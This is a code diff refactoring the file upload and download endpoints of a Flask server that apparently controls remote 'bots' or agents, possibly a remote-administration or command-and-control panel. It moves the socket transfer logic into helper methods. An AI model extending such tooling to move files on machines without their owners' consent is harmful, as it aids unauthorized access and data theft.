@@ -522,27 +522,18 @@ def send_file_to_agent():
             
         bot = Bot.botList[session_id]
         
-        # Send upload command with filename
-        bot.reliable_send({
-            'command': 'upload',
-            'filename': file.filename
-        })
-        
-        # Send file data
+        # Read file data
         file_data = file.read()
-        bot.target.sendall(len(file_data).to_bytes(8, byteorder='big'))
-        bot.target.sendall(file_data)
+        success, message = bot.upload_file(file_data, file.filename)
         
-        # Get confirmation
-        response = bot.reliable_recv()
-        if response.get('success'):
+        if success:
             return jsonify({
                 'success': True,
-                'message': f'File {file.filename} uploaded successfully'
+                'message': message
             })
         else:
             return jsonify({
-                'error': response.get('error', 'Upload failed')
+                'error': message
             }), 500
             
     except Exception as e:
@@ -564,40 +555,25 @@ def download_file_from_agent():
             
         bot = Bot.botList[session_id]
         
-        # Send download command
-        bot.reliable_send({
-            'command': 'download',
-            'filename': filename
-        })
+        # Download file from agent
+        success, message, file_data = bot.download_file(filename)
         
-        # Receive file size
-        size_data = bot.target.recv(8)
-        file_size = int.from_bytes(size_data, byteorder='big')
-        
+        if not success:
+            return jsonify({'error': message}), 500
+            
         # Create downloads directory if it doesn't exist
         os.makedirs('downloads', exist_ok=True)
         
-        # Receive and save file
+        # Save the file
         save_path = os.path.join('downloads', os.path.basename(filename))
-        received = 0
         with open(save_path, 'wb') as f:
-            while received < file_size:
-                chunk = bot.target.recv(min(4096, file_size - received))
-                if not chunk:
-                    break
-                f.write(chunk)
-                received += len(chunk)
-        
-        if received == file_size:
-            return jsonify({
-                'success': True,
-                'message': f'File {filename} downloaded successfully',
-                'path': save_path
-            })
-        else:
-            return jsonify({
-                'error': 'Download incomplete'
-            }), 500
+            f.write(file_data)
+            
+        return jsonify({
+            'success': True,
+            'message': message,
+            'path': save_path
+        })
             
     except Exception as e:
         logging.error(f"Error in file download: {str(e)}")
